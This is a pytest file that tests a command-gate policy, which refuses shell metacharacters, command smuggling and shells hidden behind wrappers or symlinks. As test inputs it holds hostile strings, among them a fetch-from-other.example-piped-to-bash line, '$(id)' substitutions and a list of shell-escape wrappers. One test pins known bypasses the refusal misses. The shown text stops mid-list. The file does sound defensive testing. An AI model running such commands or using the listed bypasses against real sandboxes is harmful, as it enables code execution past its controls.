"""C9 proof tests: verification gates as data, argv only, a shell only if declared and allowed.

Synthetic commands only. Real processes run `python -c` snippets. Nothing here deletes, writes outside tmp_path or uses the
network. Fake credentials are assembled at runtime so no complete token shape is committed.
"""

from __future__ import annotations

import json
import os
import random
import shlex
import shutil
import signal
import subprocess
import sys
import time
import types
from pathlib import Path
from typing import Any, Self

import gate_matrix
import pytest

from master_finhub.evals import gates as gm
from master_finhub.evals import runner
from master_finhub.evals.gates import (
    Gate,
    GateFileError,
    GateReport,
    GateResult,
    Plan,
    exit_code,
    load_gate_file,
    main,
    plan_gate,
    run_gates,
)
from master_finhub.sandbox.stream import ExecResult, collect, stream_process
from master_finhub.sandbox.workspace import Workspace

PY = sys.executable
SRC = Path(__file__).parent.parent / "src"
ANT = "sk-ant-" + "FAKE0" * 5  # a secret shape (synthetic)


def G(
    id: str = "g1",
    *,
    command: str | None = None,
    argv: tuple[str, ...] | None = None,
    shell: bool = False,
    timeout_s: float = 30.0,
    cwd: str = ".",
) -> Gate:
    return Gate(id, command, argv, shell, timeout_s, cwd)


def P(code: str, id: str = "g1", **kw: Any) -> Gate:
    """A gate that runs `python -c <code>`."""
    return G(id, argv=(PY, "-c", code), **kw)


def run(tmp_path: Path, gates: list[Gate], **kw: Any) -> GateReport:
    return run_gates(gates, Workspace(tmp_path), **kw)


def statuses(report: GateReport) -> list[str]:
    return [r.status for r in report.gates]


class Spy:
    """Records every Popen call. With block=True a spawn raises, so a test can prove none happens."""

    def __init__(self, real: Any) -> None:
        self.real, self.calls, self.block = real, [], False

    def __call__(self, *a: Any, **k: Any) -> Any:
        self.calls.append((a, k))
        if self.block:
            raise AssertionError("a spawn was attempted")
        return self.real(*a, **k)


@pytest.fixture
def spy(monkeypatch: pytest.MonkeyPatch) -> Spy:
    s = Spy(subprocess.Popen)
    monkeypatch.setattr(subprocess, "Popen", s)

    def boom(*a: Any, **k: Any) -> Any:
        raise AssertionError("only Popen with an argv list may be used")

    for name in ("run", "call", "check_call", "check_output"):
        monkeypatch.setattr(subprocess, name, boom)
    for name in ("system", "popen", "execv", "execvp", "posix_spawn", "spawnv"):
        monkeypatch.setattr(os, name, boom, raising=False)
    return s


def doc(*rows: Any, **top: Any) -> dict[str, Any]:
    return {"schema_version": 1, "gates": list(rows), **top}


def write(tmp_path: Path, obj: Any) -> Path:
    p = tmp_path / "gates.json"
    p.write_text(json.dumps(obj))
    return p


def write_raw(tmp_path: Path, data: bytes) -> Path:
    p = tmp_path / "gates.json"
    p.write_bytes(data)
    return p


def cli(*args: str, cwd: Path | None = None, **env: str) -> subprocess.CompletedProcess[str]:
    full = {**os.environ, "PYTHONPATH": str(SRC), **env}
    return subprocess.run(
        [PY, "-m", "master_finhub.evals.gates", *args],
        capture_output=True, text=True, env=full, check=False, timeout=120, cwd=cwd,
    )  # fmt: skip


OK = {"id": "a", "command": "pytest -q"}

# --- proof (backlog row C9) -------------------------------------------------------------


def test_proof_plain_string_runs_as_argv(tmp_path: Path, spy: Spy) -> None:
    cmd = f"{PY} -c 'print(7)'"  # no metacharacter: shlex gives argv, no shell
    report = run(tmp_path, [G(command=cmd)])
    assert statuses(report) == ["pass"] and report.gates[0].stdout_tail == "7\n"
    (args, kwargs), *rest = spy.calls
    assert not rest and args[0] == [PY, "-c", "print(7)"]
    assert not kwargs.get("shell", False)


def test_proof_metachar_is_a_policy_error_and_nothing_spawns(tmp_path: Path, spy: Spy) -> None:
    spy.block = True
    marker = tmp_path / "ran"
    report = run(tmp_path, [G(command=f"{PY} -V; touch {marker}")])
    assert statuses(report) == ["policy-error"] and "metacharacters" in report.gates[0].message
    assert spy.calls == [] and not marker.exists() and exit_code(report) == 2


def test_proof_shell_true_only_when_declared_and_allowed(tmp_path: Path, spy: Spy) -> None:
    line = "echo a && echo b"
    refused = run(tmp_path, [G(command=line)])  # not declared: metacharacters are an error
    assert statuses(refused) == ["policy-error"] and spy.calls == []
    no_flag = run(tmp_path, [G(command=line, shell=True)])  # declared, caller did not allow
    assert statuses(no_flag) == ["policy-error"] and spy.calls == []
    ok = run(tmp_path, [G(command=line, shell=True)], allow_shell=True)
    assert statuses(ok) == ["pass"] and ok.gates[0].stdout_tail == "a\nb\n"
    assert spy.calls[0][0][0] == ["/bin/sh", "-c", line]


def test_proof_timeout_is_timeout_never_pass(tmp_path: Path) -> None:
    start = time.monotonic()
    report = run(tmp_path, [P("import time; time.sleep(30)", timeout_s=0.5)])
    assert statuses(report) == ["timeout"] and report.gates[0].exit_code is None
    assert time.monotonic() - start < 10 and not report.ok and exit_code(report) == 1


# --- the file: strict schema ------------------------------------------------------------


def test_good_file_loads_exactly(tmp_path: Path) -> None:
    p = write(
        tmp_path,
        doc(
            OK,
            {"id": "b.2_x-y", "argv": ["ruff", "check"], "timeout_s": 5, "cwd": "sub"},
            {"id": "c", "command": "cd x && y", "shell": True, "timeout_s": 1800.0},
        ),
    )
    a, b, c = load_gate_file(p)
    assert a == Gate("a", "pytest -q", None, False, 300.0, ".")
    assert b == Gate("b.2_x-y", None, ("ruff", "check"), False, 5.0, "sub")
    assert isinstance(b.timeout_s, float)
    assert c == Gate("c", "cd x && y", None, True, 1800.0, ".")


def long_id(n: int) -> str:
    return "a" * n


BAD_DOCS: dict[str, Any] = {
    "empty-list": doc(),
    "gates-null": {"schema_version": 1, "gates": None},
    "gates-missing": {"schema_version": 1},
    "gates-object": {"schema_version": 1, "gates": {"a": OK}},
    "gates-number": {"schema_version": 1, "gates": 5},
    "gates-true": {"schema_version": 1, "gates": True},
    "gates-string": {"schema_version": 1, "gates": "pytest -q"},
    "root-list": [OK],
    "root-null": None,
    "root-unknown-key": doc(OK, extra=1),
    "version-missing": {"gates": [OK]},
    "version-2": doc(OK, schema_version=2),
    "version-0": doc(OK, schema_version=0),
    "version-true": doc(OK, schema_version=True),
    "version-float": doc(OK, schema_version=1.0),
    "version-str": doc(OK, schema_version="1"),
    "gate-not-object": doc("pytest -q"),
    "gate-null": doc(None),
    "gate-unknown-key": doc({**OK, "env": {"A": "b"}}),
    "id-missing": doc({"command": "x"}),
    "id-empty": doc({"id": "", "command": "x"}),
    "id-space": doc({"id": "a b", "command": "x"}),
    "id-leading-space": doc({"id": " a", "command": "x"}),
    "id-leading-dash": doc({"id": "-a", "command": "x"}),
    "id-leading-dot": doc({"id": ".a", "command": "x"}),
    "id-slash": doc({"id": "../a", "command": "x"}),
    "id-inner-slash": doc({"id": "a/b", "command": "x"}),
    "id-backslash": doc({"id": "a\\b", "command": "x"}),
    "id-colon": doc({"id": "a:b", "command": "x"}),
    "id-semicolon": doc({"id": "a;b", "command": "x"}),
    "id-inner-newline": doc({"id": "a\nb", "command": "x"}),
    "id-non-ascii": doc({"id": "caf\u00e9", "command": "x"}),
    "id-arabic-digit": doc({"id": "\u0663a", "command": "x"}),
    "id-65-chars": doc({"id": long_id(65), "command": "x"}),
    "id-number": doc({"id": 1, "command": "x"}),
    "id-newline": doc({"id": "a\n", "command": "x"}),
    "duplicate-id": doc(OK, {"id": "b", "command": "x"}, {"id": "a", "argv": ["x"]}),
    "both-command-and-argv": doc({"id": "a", "command": "x", "argv": ["x"]}),
    "neither-command-nor-argv": doc({"id": "a"}),
    "command-null-argv-null": doc({"id": "a", "command": None, "argv": None}),
    "command-number": doc({"id": "a", "command": 5}),
    "command-list": doc({"id": "a", "command": ["x"]}),
    "argv-string": doc({"id": "a", "argv": "pytest -q"}),
    "argv-number-item": doc({"id": "a", "argv": ["x", 1]}),
    "argv-nested": doc({"id": "a", "argv": [["x"]]}),
    "argv-null-item": doc({"id": "a", "argv": ["x", None]}),
    "shell-string": doc({"id": "a", "command": "x", "shell": "yes"}),
    "shell-false-string": doc({"id": "a", "command": "x", "shell": "false"}),
    "shell-one": doc({"id": "a", "command": "x", "shell": 1}),
    "shell-null": doc({"id": "a", "command": "x", "shell": None}),
    "shell-with-argv": doc({"id": "a", "argv": ["x"], "shell": True}),
    "timeout-zero": doc({"id": "a", "command": "x", "timeout_s": 0}),
    "timeout-negative": doc({"id": "a", "command": "x", "timeout_s": -1}),
    "timeout-1800-5": doc({"id": "a", "command": "x", "timeout_s": 1800.5}),
    "timeout-1801": doc({"id": "a", "command": "x", "timeout_s": 1801}),
    "timeout-true": doc({"id": "a", "command": "x", "timeout_s": True}),
    "timeout-string": doc({"id": "a", "command": "x", "timeout_s": "5"}),
    "timeout-null": doc({"id": "a", "command": "x", "timeout_s": None}),
    "timeout-huge-float": doc({"id": "a", "command": "x", "timeout_s": 1e999}),
    "timeout-huge-int": doc({"id": "a", "command": "x", "timeout_s": 10**400}),
    "cwd-number": doc({"id": "a", "command": "x", "cwd": 5}),
    "cwd-null": doc({"id": "a", "command": "x", "cwd": None}),
    "too-many-gates": doc(*({"id": f"g{i}", "command": "x"} for i in range(51))),
}


@pytest.mark.parametrize("name", list(BAD_DOCS))
def test_bad_file_is_refused_and_exit_2(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, spy: Spy, name: str
) -> None:
    spy.block = True
    p = write(tmp_path, BAD_DOCS[name])
    with pytest.raises(GateFileError):
        load_gate_file(p)
    assert main([str(p), "--root", str(tmp_path)]) == 2
    out = capsys.readouterr().out
    assert out.startswith("Gate file: ") and not out.lstrip().startswith("{")
    assert spy.calls == []


RAW_BAD = {
    "nan": b'{"schema_version":1,"gates":[{"id":"a","command":"x","timeout_s":NaN}]}',
    "infinity": b'{"schema_version":1,"gates":[{"id":"a","command":"x","timeout_s":Infinity}]}',
    "minus-infinity": b'{"schema_version":1,"gates":[{"id":"a","command":"x","timeout_s":-Infinity}]}',
    "duplicate-root-key": b'{"schema_version":1,"schema_version":1,"gates":[{"id":"a","command":"x"}]}',
    "duplicate-gate-key": b'{"schema_version":1,"gates":[{"id":"a","command":"x","command":"y"}]}',
    "bom": b'\xef\xbb\xbf{"schema_version":1,"gates":[{"id":"a","command":"x"}]}',
    "invalid-utf8": b'{"schema_version":1,"gates":[{"id":"a","command":"\xff\xfe"}]}',
    "latin1": b'{"schema_version":1,"gates":[{"id":"a","command":"caf\xe9"}]}',
    "empty-file": b"",
    "truncated": b'{"schema_version":1,"gates":[{"id":"a","comm',
    "trailing-comma": b'{"schema_version":1,"gates":[{"id":"a","command":"x"},]}',
    "yaml": b"schema_version: 1\ngates:\n  - id: a\n",
    "deep-nesting": b"[" * 250_000,
    "deep-nesting-object": b'{"schema_version":1,"gates":' + b"[" * 250_000,
    "huge-int-digits": b'{"schema_version":1,"gates":[{"id":"a","command":"x","timeout_s":'
    + b"1" * 5000
    + b"}]}",
}


@pytest.mark.parametrize("name", list(RAW_BAD))
def test_bad_raw_file_is_refused(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, spy: Spy, name: str
) -> None:
    spy.block = True
    p = write_raw(tmp_path, RAW_BAD[name])
    with pytest.raises(GateFileError):
        load_gate_file(p)
    assert main([str(p), "--root", str(tmp_path)]) == 2
    assert capsys.readouterr().out.startswith("Gate file: ")
    assert spy.calls == []


def test_empty_gate_list_exit_2_nothing_runs(
    capsys: pytest.CaptureFixture[str], tmp_path: Path
) -> None:
    assert main([str(write(tmp_path, doc())), "--root", str(tmp_path)]) == 2
    assert '"gates" must be a non-empty list' in capsys.readouterr().out


def test_run_gates_refuses_an_empty_list(tmp_path: Path, spy: Spy) -> None:
    with pytest.raises(ValueError):
        run(tmp_path, [])
    assert spy.calls == []


def test_gate_count_boundary(tmp_path: Path) -> None:
    fifty = doc(*({"id": f"g{i}", "command": "x"} for i in range(50)))
    assert len(load_gate_file(write(tmp_path, fifty))) == 50
    one = doc({"id": "only", "command": "x"})
    assert len(load_gate_file(write(tmp_path, one))) == 1


def test_file_size_boundary(tmp_path: Path) -> None:
    body = json.dumps(doc(OK)).encode()
    at_cap = body + b" " * (gm.MAX_FILE_BYTES - len(body))
    assert len(load_gate_file(write_raw(tmp_path, at_cap))) == 1
    with pytest.raises(GateFileError, match="larger than"):
        load_gate_file(write_raw(tmp_path, at_cap + b" "))


def test_file_size_cap_applies_before_parsing(tmp_path: Path) -> None:
    p = write_raw(tmp_path, b"[" * 5_000_000)  # 5 MB: refused on size, never parsed
    start = time.monotonic()
    with pytest.raises(GateFileError, match="larger than"):
        load_gate_file(p)
    assert time.monotonic() - start < 2


@pytest.mark.parametrize("kind", ["missing", "directory"])
def test_missing_or_directory_gate_file_exit_2(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, kind: str
) -> None:
    target = tmp_path / ("nope.json" if kind == "missing" else "")
    assert main([str(target), "--root", str(tmp_path)]) == 2
    assert "not a regular file" in capsys.readouterr().out


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="needs os.mkfifo")
def test_fifo_gate_file_is_refused_without_blocking(tmp_path: Path) -> None:
    fifo = tmp_path / "gates.json"
    os.mkfifo(fifo)
    with pytest.raises(GateFileError, match="not a regular file"):
        load_gate_file(fifo)


def test_unreadable_gate_file_exit_2(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    p = write(tmp_path, doc(OK))

    def deny(*a: Any, **k: Any) -> Any:
        raise PermissionError(13, "denied")

    monkeypatch.setattr("builtins.open", deny)
    with pytest.raises(GateFileError, match="cannot be read"):
        load_gate_file(p)


def test_symlink_to_a_regular_gate_file_is_accepted(tmp_path: Path) -> None:
    real = write(tmp_path, doc(OK))
    link = tmp_path / "link.json"
    link.symlink_to(real)
    assert len(load_gate_file(link)) == 1


@pytest.mark.parametrize(
    ("value", "good"),
    [(1800, True), (1799.9, True), (0.001, True), (1800.0001, False), (0, False), (-0.001, False)],
)
def test_timeout_bounds(tmp_path: Path, value: float, good: bool) -> None:
    p = write(tmp_path, doc({"id": "a", "command": "x", "timeout_s": value}))
    if good:
        assert load_gate_file(p)[0].timeout_s == float(value)
    else:
        with pytest.raises(GateFileError, match="timeout_s"):
            load_gate_file(p)


def test_id_boundaries(tmp_path: Path) -> None:
    for ok in ("a", "A9", "9a", "a.b_c-d", long_id(64)):
        assert load_gate_file(write(tmp_path, doc({"id": ok, "command": "x"})))[0].id == ok


def test_a_gate_file_is_not_a_c4_baseline(
    capsys: pytest.CaptureFixture[str], tmp_path: Path
) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    assert main([str(gf), "--root", str(tmp_path)]) == 0  # the real CLI report, not a rebuilt one
    p = tmp_path / "prev.json"
    p.write_text(capsys.readouterr().out)
    with pytest.raises(ValueError, match="results"):
        runner.load_baseline(p)
    bench = Path(__file__).parent.parent / "src/master_finhub/evals/benchmarks/echo_pass.json"
    assert runner.main(["--baseline", str(p), str(bench)]) == 2
    assert "Baseline" in capsys.readouterr().out


# --- the policy: string -> argv ---------------------------------------------------------


def plan(tmp_path: Path, **kw: Any) -> Plan | str:
    allow = kw.pop("allow_shell", False)
    return plan_gate(G(**kw), Workspace(tmp_path), allow)


@pytest.mark.parametrize("ch", list(";&|`$<>\n\r"), ids=lambda c: repr(c))
def test_every_metacharacter_is_refused(tmp_path: Path, ch: str) -> None:
    got = plan(tmp_path, command=f"pytest a{ch}b")
    assert isinstance(got, str) and "metacharacters" in got


@pytest.mark.parametrize(
    "line",
    [
        "gate; fetch other.example/p | bash",
        "gate && other",
        "gate || other",
        "gate `id`",
        "gate $(id)",
        "pytest > out.txt",
        "pytest < in.txt",
        "pytest\nsecond",
        "pytest\r\nsecond",
        "pytest -k 'a;b'",
        'pytest -k "a|b"',
        "echo $HOME",
        "echo '$x'",
        "pytest 2>&1",
        "pytest &",
        "python -c 'import sys; sys.exit(0)'",
    ],
)
def test_metacharacters_refused_even_inside_quotes(tmp_path: Path, line: str) -> None:
    got = plan(tmp_path, command=line)
    assert isinstance(got, str) and "metacharacters" in got and "argv" in got


def test_shell_false_with_metacharacters_is_still_refused(tmp_path: Path) -> None:
    got = plan(tmp_path, command="gate; other", shell=False, allow_shell=True)
    assert isinstance(got, str) and "metacharacters" in got


@pytest.mark.parametrize(
    ("line", "argv"),
    [
        ("pytest -q", ("pytest", "-q")),
        ("  pytest   -q  ", ("pytest", "-q")),
        ("pytest\t-q", ("pytest", "-q")),
        ("pytest -q\n", ("pytest", "-q")),
        ('ruff check "src tests" scripts', ("ruff", "check", "src tests", "scripts")),
        ("pytest -k 'a or b'", ("pytest", "-k", "a or b")),
        ("pytest tests/test_*.py", ("pytest", "tests/test_*.py")),  # globs stay literal
        ("ls ~", ("ls", "~")),  # no tilde expansion
        ("echo (x)", ("echo", "(x)")),
        ("echo {a,b}", ("echo", "{a,b}")),
        ("pytest # c", ("pytest", "#", "c")),  # no comment handling
        ("pytest -k a=b", ("pytest", "-k", "a=b")),
        ('echo "" x', ("echo", "", "x")),
        ("echo \u00e9\u00e8", ("echo", "\u00e9\u00e8")),
        (r"python C:\x\y.py", ("python", "C:xy.py")),  # POSIX backslash escape, pinned
        ("x" * 4096, ("x" * 4096,)),
    ],
)
def test_plain_strings_become_argv(tmp_path: Path, line: str, argv: tuple[str, ...]) -> None:
    got = plan(tmp_path, command=line)
    assert isinstance(got, Plan) and got.argv == argv


@pytest.mark.parametrize(
    ("line", "why"),
    [
        ("", "empty command"),
        ("   ", "empty command"),
        ("\t \t", "empty command"),
        ("pytest 'a", "could not tokenize"),
        ('pytest "a', "could not tokenize"),
        ("pytest a\\", "could not tokenize"),
        ('"" x', "empty executable"),
        ("''", "empty executable"),
        ("-q pytest", "starts with '-'"),
        ("--version", "starts with '-'"),
        ("A=b pytest", "contains '='"),
        ("PATH=x python", "contains '='"),
        ("pytest\x00x", "NUL"),
        ("x" * 4097, "too long"),
        ("pytest " + "a" * 4090, "too long"),
    ],
)
def test_plain_strings_refused(tmp_path: Path, line: str, why: str) -> None:
    got = plan(tmp_path, command=line)
    assert isinstance(got, str) and why in got, got


def test_command_length_boundary(tmp_path: Path) -> None:
    ok = "pytest " + "a" * (4096 - 7)
    assert isinstance(plan(tmp_path, command=ok), Plan)
    assert plan(tmp_path, command=ok + "a") == "command is too long"


@pytest.mark.parametrize("n", [1, 256])
def test_argv_item_count_accepted(tmp_path: Path, n: int) -> None:
    got = plan(tmp_path, argv=("echo",) * n)
    assert isinstance(got, Plan) and len(got.argv) == n


def test_argv_item_count_limit(tmp_path: Path) -> None:
    assert plan(tmp_path, argv=("echo",) * 257) == "argv is too long"


def test_argv_item_length_boundary(tmp_path: Path) -> None:
    assert isinstance(plan(tmp_path, argv=("echo", "a" * 4096)), Plan)
    assert plan(tmp_path, argv=("echo", "a" * 4097)) == "argv is too long"


def test_huge_argv_is_refused_by_the_guard_cap(tmp_path: Path) -> None:
    got = plan(tmp_path, argv=("echo",) + ("a" * 4096,) * 255)
    assert isinstance(got, str) and "too-long" in got


def test_argv_form_is_verbatim(tmp_path: Path) -> None:
    items = (PY, "-c", "import sys; print($HOME `x` | > <)", "a b", "", "~", "*")
    got = plan(tmp_path, argv=items)
    assert isinstance(got, Plan) and got.argv == items


@pytest.mark.parametrize(
    ("argv", "why"),
    [
        ((), "empty command"),
        (("",), "empty executable"),
        (("", "x"), "empty executable"),
        (("-x",), "starts with '-'"),
        (("A=b", "x"), "contains '='"),
        (("pytest", "a\x00b"), "NUL"),
        (("pytest", "\ud800"), "not valid text"),
        (("pytest", chr(0xDCFF)), "not valid text"),
    ],
)
def test_argv_form_refused(tmp_path: Path, argv: tuple[str, ...], why: str) -> None:
    got = plan(tmp_path, argv=argv)
    assert isinstance(got, str) and why in got, got


def test_later_argument_may_start_with_dash_and_contain_equals(tmp_path: Path) -> None:
    got = plan(tmp_path, argv=("pytest", "-q", "--maxfail=1", "a=b"))
    assert isinstance(got, Plan)


# --- shell gates -------------------------------------------------------------------------


def test_shell_gate_plan_is_sh_dash_c(tmp_path: Path) -> None:
    got = plan(tmp_path, command="cd x && y", shell=True, allow_shell=True)
    assert isinstance(got, Plan) and got.argv == ("/bin/sh", "-c", "cd x && y")


# --- a shell is not a non-shell gate ------------------------------------------------------------

SHELL_FORMS = [
    ("argv", ("sh", "-c", "echo A; echo B > out.txt && echo $0")),
    ("argv", ("bash", "-c", "echo $HOME > f")),
    ("argv", ("bash", "--noprofile", "-c", "a;b")),
    ("argv", ("/bin/sh", "-c", "id && id")),
    ("argv", ("/usr/bin/env", "bash")),
    ("argv", ("dash", "-c", "a;b")),
    ("argv", ("zsh", "-c", "a;b")),
    ("argv", ("ksh", "-c", "a")),
    ("argv", ("fish", "-c", "a")),
    ("argv", ("csh", "-c", "a")),
    ("argv", ("tcsh", "-c", "a")),
    ("argv", ("ash", "-c", "a")),
    ("argv", ("mksh", "-c", "a")),
    ("argv", ("rbash", "-c", "a")),
    ("argv", ("BASH", "-c", "a")),
    ("argv", ("Sh", "-c", "a")),
    ("argv", ("bash.exe", "-c", "a")),
    ("argv", ("C:/tools/SH.EXE", "-c", "a")),
    ("argv", ("./sh", "-c", "a")),
    ("argv", ("env", "sh", "-c", "a;b")),
    ("argv", ("env", "A=1", "bash")),
    ("argv", ("busybox", "sh", "-c", "a;b")),
    ("argv", ("xargs", "-I{}", "sh", "-c", "{}")),
    ("argv", ("find", ".", "-exec", "sh", "-c", "a;b", "{}", ";")),
    ("argv", ("find", ".", "-execdir", "/bin/bash", "-c", "a", ";")),
    ("argv", ("nohup", "sh", "-c", "a")),
    ("argv", ("exec", "bash")),
    ("argv", ("command", "sh")),
    ("argv", ("sudo", "-u", "x", "sh")),
    ("argv", ("timeout", "5", "sh", "-c", "a")),
    ("argv", ("nice", "-n", "5", "bash")),
    ("argv", ("setsid", "sh")),
    ("argv", ("su", "-c", "a;b")),
    ("argv", ("su",)),
    ("argv", ("watch", "ls")),
    ("string", "sh -c id"),
    ("string", "bash -c ls"),
    ("string", "/bin/sh -c id"),
    ("string", "env sh"),
    ("string", "'sh' -c id"),
    ("string", "  dash  "),
]


@pytest.mark.parametrize("form, value", SHELL_FORMS, ids=lambda v: str(v)[:40])
def test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate(
    tmp_path: Path, form: str, value: Any
) -> None:
    kw = {"argv": value} if form == "argv" else {"command": value}
    got = plan(tmp_path, **kw)
    assert isinstance(got, str) and "shell" in got and "--allow-shell" in got


NOT_SHELLS = [
    ("pytest", "-k", "bash"),  # a plain program: only argv[0] and wrapper arguments are looked at
    ("python", "-c", "print(1)"),
    ("env", "A=1", "pytest"),
    ("env", "python", "-V"),
    ("xargs", "-n1", "echo"),
    ("find", ".", "-name", "x"),
    ("timeout", "5", "pytest"),
    ("nice", "-n", "5", "ruff"),
    ("shellcheck", "x.sh"),
    ("bash-completion",),
    ("fishfood",),
    ("sh.py",),
    ("ssh-keygen",),
    ("busybox", "ls"),
]


@pytest.mark.parametrize("argv", NOT_SHELLS, ids=lambda v: " ".join(v)[:40])
def test_ordinary_programs_are_not_mistaken_for_shells(
    tmp_path: Path, argv: tuple[str, ...]
) -> None:
    got = plan(tmp_path, argv=argv)
    assert isinstance(got, Plan) and got.argv == argv


# --- the child starts in the GATE's folder: so does the resolution (ATK4, round 2) ---------------


def _shell_link(folder: Path, name: str = "mysh") -> Path:
    target = shutil.which("sh")
    assert target is not None
    folder.mkdir(parents=True, exist_ok=True)
    (folder / name).symlink_to(target)
    return folder / name


def test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spy: Spy
) -> None:
    """The judge's repro 1: runner in the parent folder, gate cwd 'sub', ./mysh -> a shell."""
    spy.block = True
    sub = tmp_path / "sub"
    _shell_link(sub)
    monkeypatch.chdir(tmp_path)
    gate = G(argv=("./mysh", "-c", "echo A; echo B > out.txt"), cwd="sub")
    got = plan_gate(gate, Workspace(tmp_path), False)
    assert isinstance(got, str) and "--allow-shell" in got
    report = run(tmp_path, [gate])
    assert (
        statuses(report) == ["policy-error"] and spy.calls == [] and not (sub / "out.txt").exists()
    )


def test_a_relative_symlink_is_refused_when_the_runner_is_in_another_folder(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spy: Spy
) -> None:
    """The judge's repro 2: runner in other/, root = sub, default cwd, ./mysh -> a shell."""
    spy.block = True
    sub, other = tmp_path / "sub", tmp_path / "other"
    _shell_link(sub)
    other.mkdir()
    monkeypatch.chdir(other)
    gate = G(argv=("./mysh", "-c", "echo B > out2.txt"))
    got = plan_gate(gate, Workspace(sub), False)
    assert isinstance(got, str) and "--allow-shell" in got
    report = run_gates([gate], Workspace(sub))
    assert (
        statuses(report) == ["policy-error"] and spy.calls == [] and not (sub / "out2.txt").exists()
    )


@pytest.mark.parametrize("variant", ["cwd-sub", "root-sub"])
def test_the_real_cli_refuses_a_relative_link_to_a_shell_and_creates_nothing(
    tmp_path: Path, variant: str
) -> None:
    sub, other = tmp_path / "sub", tmp_path / "other"
    _shell_link(sub)
    other.mkdir()
    if variant == "cwd-sub":
        gf = write(
            tmp_path, doc({"id": "a", "argv": ["./mysh", "-c", "echo B > out.txt"], "cwd": "sub"})
        )
        proc = cli(str(gf), cwd=tmp_path)
    else:
        gf = write(tmp_path, doc({"id": "a", "argv": ["./mysh", "-c", "echo B > out.txt"]}))
        proc = cli(str(gf), "--root", str(sub), cwd=other)
    assert proc.returncode == 2 and json.loads(proc.stdout)["gates"][0]["status"] == "policy-error"
    assert not (sub / "out.txt").exists() and not (other / "out.txt").exists()


@pytest.mark.parametrize("path_value", ["bin", ".", "", "/nonexistent::/nonexistent", "bin:."])
def test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, path_value: str
) -> None:
    """The child's exec treats an empty or relative PATH entry as its own cwd (the gate cwd)."""
    gate_dir, other = tmp_path / "gate", tmp_path / "other"
    _shell_link(gate_dir / "bin", "mytool")
    _shell_link(gate_dir, "mytool")
    other.mkdir()
    monkeypatch.chdir(other)
    monkeypatch.setenv("PATH", path_value)
    got = plan_gate(G(argv=("mytool", "-c", "a"), cwd="."), Workspace(gate_dir), False)
    assert isinstance(got, str) and "--allow-shell" in got


def test_the_relative_path_entry_is_not_taken_from_the_runner_cwd(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A link to a shell in the RUNNER's folder must not make an unrelated gate folder refused."""
    runner_dir, gate_dir = tmp_path / "runner", tmp_path / "gate"
    _shell_link(runner_dir, "mytool")
    gate_dir.mkdir()
    (gate_dir / "mytool").write_text("#!/bin/sh\nexit 0\n")
    (gate_dir / "mytool").chmod(0o755)
    monkeypatch.chdir(runner_dir)
    monkeypatch.setenv("PATH", ".")
    got = plan_gate(G(argv=("mytool",), cwd="."), Workspace(gate_dir), False)
    assert isinstance(got, Plan)


def test_a_non_executable_file_on_path_is_skipped_like_the_child_does(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    first, second = tmp_path / "first", tmp_path / "second"
    first.mkdir()
    (first / "mytool").symlink_to(shutil.which("sh") or "/bin/sh")
    (first / "mytool").unlink()
    (first / "mytool").write_text("data")  # not executable: exec skips it
    _shell_link(second, "mytool")
    monkeypatch.setenv("PATH", f"{first}:{second}")
    got = plan(tmp_path, argv=("mytool", "-c", "a"))
    assert isinstance(got, str) and "--allow-shell" in got


def test_a_directory_of_the_same_name_on_path_is_skipped_like_the_child_does(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    first, second = tmp_path / "first", tmp_path / "second"
    (first / "mytool").mkdir(parents=True)  # exec cannot run a directory: it moves on
    _shell_link(second, "mytool")
    monkeypatch.setenv("PATH", f"{first}:{second}")
    got = plan(tmp_path, argv=("mytool", "-c", "a"))
    assert isinstance(got, str) and "--allow-shell" in got


def test_the_stated_residual_limits_of_the_shell_refusal_are_pinned(tmp_path: Path) -> None:
    """Not detected, on purpose (Does not cover): a copy or hard link of a shell, a symlink to a
    wrapper, and a link made by an EARLIER gate (every gate is validated before any runs)."""
    shell = shutil.which("sh")
    assert shell is not None
    shutil.copy(os.path.realpath(shell), tmp_path / "copied")
    os.link(
        tmp_path / "copied", tmp_path / "hard"
    )  # a hard link of our own copy: protected_hardlinks forbids linking /usr/bin/dash
    (tmp_path / "toolwrapper").symlink_to(shutil.which("env") or "/usr/bin/env")
    for argv in [("./copied", "-c", "a"), ("./hard", "-c", "a"), ("./toolwrapper", "sh")]:
        assert isinstance(plan(tmp_path, argv=argv), Plan), argv
    first = G("one", argv=("ln", "-s", shell, "later"))
    second = G("two", argv=("./later", "-c", "echo B > out.txt"))
    assert isinstance(plan_gate(first, Workspace(tmp_path), False), Plan)
    assert isinstance(
        plan_gate(second, Workspace(tmp_path), False), Plan
    )  # the link does not exist yet


@pytest.mark.parametrize(
    "argv",
    [
        ("timeout", "5", "pytest", "tests/shell/sh"),
        ("find", ".", "-path", "*/bash"),
        ("time", "pytest", "-k", "sh"),
    ],
    ids=lambda v: " ".join(v)[:40],
)
def test_the_documented_wrapper_false_positives_are_refused(
    tmp_path: Path, argv: tuple[str, ...]
) -> None:
    got = plan(tmp_path, argv=argv)
    assert isinstance(got, str) and "wrapper" in got


# --- /proc and /dev are refused outright (ATK5, round 3), and the PATH search takes the FIRST hit (ATK6) ---


def _fake_shell(folder: Path, name: str = "bash") -> Path:
    """An executable file called like a shell that, if it ever ran, writes out.txt in its cwd.
    Host independent (a link to the host's own `sh` is a busybox applet on Alpine)."""
    folder.mkdir(parents=True, exist_ok=True)
    path = folder / name
    path.write_text('#!/bin/sh\necho RAN > "$PWD/out.txt"\n')
    path.chmod(0o755)
    return path


def _proc_words(gate_dir: Path) -> list[str]:
    deep = "../" * 40
    return [
        "/proc/self/cwd/mysh",
        "/proc/thread-self/cwd/mysh",
        "/proc/self/cwd/./mysh",
        f"/proc/{os.getpid()}/cwd/mysh",
